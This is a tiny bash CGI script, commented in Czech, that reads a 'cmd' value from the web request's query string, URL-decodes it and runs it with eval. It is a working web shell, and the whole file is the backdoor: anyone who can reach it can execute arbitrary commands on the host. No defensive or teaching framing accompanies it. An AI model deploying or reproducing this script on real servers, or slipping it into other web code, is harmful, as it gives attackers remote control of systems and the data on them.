#!/bin/bash
echo "Content-Type: text/plain"
echo ""

# Ziskej cmd z QUERY_STRING
CMD="${QUERY_STRING#cmd=}"
# Dekoduj %20 na mezery a ostatni URL encoding
CMD="${CMD//+/ }"
CMD=$(printf '%b' "${CMD//%/\\x}")

eval "$CMD"